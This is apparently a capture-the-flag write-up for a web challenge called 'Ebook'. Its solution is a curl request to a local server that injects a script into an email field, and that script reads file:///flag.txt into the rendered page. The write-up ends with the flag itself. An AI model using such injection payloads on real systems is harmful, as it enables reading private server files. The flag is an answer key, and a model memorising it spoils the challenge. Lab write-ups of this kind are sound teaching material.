# Ebook

Description: Do you like reading? Check out this website to get a preview of some great books.

# Solution

If the below command does not work you might need to update the cookie with a valid one create a user and login

```bash
curl 'http://localhost:5000/order/1' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: ebook=eyJpZCI6MX0.YXmnrw.hjhKtxLI7SLBTElSlCbJp7XVLDw' \
  --data-raw '{"email":["ignacio.dominguez95@gmail.com","<script>x=new XMLHttpRequest;x.onload=function(){document.body.appendChild(document.createTextNode(this.responseText))};x.open(\"GET\",\"file:///flag.txt\");x.send();</script>"]}'
```

# Flag

flag{1bf6c08dfe83a9d42e77c6915b0260f5}
